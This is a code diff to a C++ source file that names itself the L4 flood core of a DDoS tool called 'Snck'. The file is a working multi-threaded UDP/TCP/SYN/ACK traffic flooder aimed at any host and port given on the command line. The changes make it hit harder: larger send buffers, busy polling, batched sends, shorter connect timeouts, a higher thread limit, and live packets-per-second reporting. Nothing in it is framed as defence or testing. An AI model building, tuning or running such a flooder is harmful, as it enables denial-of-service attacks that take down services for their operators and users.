@@ -1,8 +1,7 @@
 // language: C++17, file: cpp/snck_l4.cpp, target: Linux
-// High-throughput L4 flood core for Snck-ddos
-// Build: g++ -O3 -march=native -pthread -o snck_l4 snck_l4.cpp
-// Usage: ./snck_l4 <method> <host> <port> <threads> <duration_sec> [payload_size]
-// Methods: udp | tcp | syn | ack | mix
+// Snck ultra L4 core — multi-thread UDP/TCP/SYN/ACK/MIX
+// Build: g++ -O3 -march=native -pthread -std=c++17 -o snck_l4 snck_l4.cpp
+// Usage: ./snck_l4 <udp|tcp|syn|ack|mix> <host> <port> <threads> <duration> [payload]
 
 #include <arpa/inet.h>
 #include <fcntl.h>
@@ -22,7 +21,7 @@
 #include <vector>
 
 using namespace std;
-using clock_t_ = chrono::steady_clock;
+using steady = chrono::steady_clock;
 
 static atomic<uint64_t> g_packets{0};
 static atomic<uint64_t> g_bytes{0};
@@ -36,22 +35,27 @@ static string resolve_ip(const string& host) {
     if (getaddrinfo(host.c_str(), nullptr, &hints, &res) != 0 || !res)
         return host;
     char buf[INET_ADDRSTRLEN]{};
-    auto* sa = reinterpret_cast<sockaddr_in*>(res->ai_addr);
-    inet_ntop(AF_INET, &sa->sin_addr, buf, sizeof(buf));
+    inet_ntop(AF_INET, &reinterpret_cast<sockaddr_in*>(res->ai_addr)->sin_addr, buf, sizeof(buf));
     freeaddrinfo(res);
     return string(buf);
 }
 
 static void fill_random(vector<uint8_t>& buf, mt19937& rng) {
-    uniform_int_distribution<int> dist(0, 255);
-    for (auto& b : buf) b = static_cast<uint8_t>(dist(rng));
+    uniform_int_distribution<int> d(0, 255);
+    for (auto& b : buf) b = static_cast<uint8_t>(d(rng));
 }
 
 static void worker_udp(string ip, uint16_t port, int payload_size) {
     int fd = socket(AF_INET, SOCK_DGRAM, 0);
     if (fd < 0) { g_errors++; return; }
-    int bufsize = 4 * 1024 * 1024;
+    int bufsize = 32 * 1024 * 1024;
     setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
+#ifdef SO_BUSY_POLL
+    int busy = 50;
+    setsockopt(fd, SOL_SOCKET, SO_BUSY_POLL, &busy, sizeof(busy));
+#endif
+    int on = 1;
+    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));
 
     sockaddr_in addr{};
     addr.sin_family = AF_INET;
@@ -63,13 +67,15 @@ static void worker_udp(string ip, uint16_t port, int payload_size) {
     fill_random(payload, rng);
 
     while (!g_stop.load(memory_order_relaxed)) {
-        ssize_t n = sendto(fd, payload.data(), payload.size(), MSG_NOSIGNAL,
-                           reinterpret_cast<sockaddr*>(&addr), sizeof(addr));
-        if (n > 0) {
-            g_packets.fetch_add(1, memory_order_relaxed);
-            g_bytes.fetch_add(static_cast<uint64_t>(n), memory_order_relaxed);
-        } else {
-            g_errors.fetch_add(1, memory_order_relaxed);
+        for (int i = 0; i < 8 && !g_stop.load(memory_order_relaxed); ++i) {
+            ssize_t n = sendto(fd, payload.data(), payload.size(), MSG_NOSIGNAL,
+                               reinterpret_cast<sockaddr*>(&addr), sizeof(addr));
+            if (n > 0) {
+                g_packets.fetch_add(1, memory_order_relaxed);
+                g_bytes.fetch_add(static_cast<uint64_t>(n), memory_order_relaxed);
+            } else {
+                g_errors.fetch_add(1, memory_order_relaxed);
+            }
         }
     }
     close(fd);
@@ -88,8 +94,11 @@ static void worker_tcp(string ip, uint16_t port, int payload_size, bool write_da
     while (!g_stop.load(memory_order_relaxed)) {
         int fd = socket(AF_INET, SOCK_STREAM, 0);
         if (fd < 0) { g_errors.fetch_add(1, memory_order_relaxed); continue; }
+
         int flags = fcntl(fd, F_GETFL, 0);
         fcntl(fd, F_SETFL, flags | O_NONBLOCK);
+        int on = 1;
+        setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &on, sizeof(on));
 
         int rc = connect(fd, reinterpret_cast<sockaddr*>(&addr), sizeof(addr));
         if (rc < 0 && errno != EINPROGRESS) {
@@ -101,7 +110,7 @@ static void worker_tcp(string ip, uint16_t port, int payload_size, bool write_da
         fd_set wfds;
         FD_ZERO(&wfds);
         FD_SET(fd, &wfds);
-        timeval tv{1, 0};
+        timeval tv{0, 400000};
         rc = select(fd + 1, nullptr, &wfds, nullptr, &tv);
         if (rc <= 0) {
             close(fd);
@@ -127,21 +136,15 @@ static void worker_tcp(string ip, uint16_t port, int payload_size, bool write_da
 }
 
 static void worker_mix(string ip, uint16_t port, int payload_size, int id) {
-    if (id % 2 == 0)
-        worker_udp(ip, port, payload_size);
-    else
-        worker_tcp(ip, port, payload_size, true);
-}
-
-static void print_usage(const char* argv0) {
-    cerr << "Snck L4 core (C++)\n"
-         << "Usage: " << argv0
-         << " <udp|tcp|syn|ack|mix> <host> <port> <threads> <duration_sec> [payload_size]\n";
+    if (id & 1) worker_tcp(ip, port, payload_size, true);
+    else worker_udp(ip, port, payload_size);
 }
 
 int main(int argc, char** argv) {
     if (argc < 6) {
-        print_usage(argv[0]);
+        cerr << "Snck L4 ultra\n"
+             << "Usage: " << argv[0]
+             << " <udp|tcp|syn|ack|mix> <host> <port> <threads> <duration> [payload]\n";
         return 1;
     }
 
@@ -150,60 +153,50 @@ int main(int argc, char** argv) {
     int port = atoi(argv[3]);
     int threads = atoi(argv[4]);
     int duration = atoi(argv[5]);
-    int payload = (argc >= 7) ? atoi(argv[6]) : 1024;
+    int payload = argc >= 7 ? atoi(argv[6]) : 1200;
 
-    if (port <= 0 || port > 65535 || threads < 1 || threads > 4096 || duration < 1) {
-        cerr << "invalid args\n";
+    if (port < 1 || port > 65535 || threads < 1 || threads > 8192 || duration < 1)
         return 1;
-    }
-    if (payload < 16) payload = 16;
-    if (payload > 65507) payload = 65507;
+    payload = max(16, min(payload, 65507));
 
     string ip = resolve_ip(host);
-    cerr << "[snck_l4] method=" << method << " target=" << ip << ":" << port
+    cerr << "[snck_l4] " << method << " " << ip << ":" << port
          << " threads=" << threads << " duration=" << duration
          << " payload=" << payload << "\n";
 
     vector<thread> pool;
     pool.reserve(static_cast<size_t>(threads));
-
     for (int i = 0; i < threads; ++i) {
         if (method == "udp")
-            pool.emplace_back(worker_udp, ip, static_cast<uint16_t>(port), payload);
+            pool.emplace_back(worker_udp, ip, (uint16_t)port, payload);
         else if (method == "tcp" || method == "ack")
-            pool.emplace_back(worker_tcp, ip, static_cast<uint16_t>(port), payload, true);
+            pool.emplace_back(worker_tcp, ip, (uint16_t)port, payload, true);
         else if (method == "syn")
-            pool.emplace_back(worker_tcp, ip, static_cast<uint16_t>(port), payload, false);
+            pool.emplace_back(worker_tcp, ip, (uint16_t)port, payload, false);
         else if (method == "mix")
-            pool.emplace_back(worker_mix, ip, static_cast<uint16_t>(port), payload, i);
+            pool.emplace_back(worker_mix, ip, (uint16_t)port, payload, i);
         else {
-            cerr << "unknown method: " << method << "\n";
-            g_stop = true;
-            break;
+            cerr << "unknown method\n";
+            return 1;
         }
     }
 
-    auto t0 = clock_t_::now();
-    while (true) {
+    auto t0 = steady::now();
+    while (chrono::duration<double>(steady::now() - t0).count() < duration) {
         this_thread::sleep_for(chrono::milliseconds(500));
-        auto elapsed = chrono::duration<double>(clock_t_::now() - t0).count();
-        if (elapsed >= duration) break;
+        double elapsed = chrono::duration<double>(steady::now() - t0).count();
         uint64_t pkts = g_packets.load();
         uint64_t by = g_bytes.load();
-        double pps = pkts / max(elapsed, 0.001);
-        double mbps = (by * 8.0) / max(elapsed, 0.001) / 1e6;
         cout << "STATS packets=" << pkts << " bytes=" << by
              << " errors=" << g_errors.load()
-             << " pps=" << fixed << pps
-             << " mbps=" << mbps << endl;
+             << " pps=" << (pkts / max(elapsed, 0.001))
+             << " mbps=" << ((by * 8.0) / max(elapsed, 0.001) / 1e6) << endl;
     }
 
     g_stop = true;
-    for (auto& t : pool) {
-        if (t.joinable()) t.join();
-    }
+    for (auto& t : pool) if (t.joinable()) t.join();
 
-    double elapsed = chrono::duration<double>(clock_t_::now() - t0).count();
+    double elapsed = chrono::duration<double>(steady::now() - t0).count();
     uint64_t pkts = g_packets.load();
     uint64_t by = g_bytes.load();
     cout << "DONE packets=" << pkts << " bytes=" << by
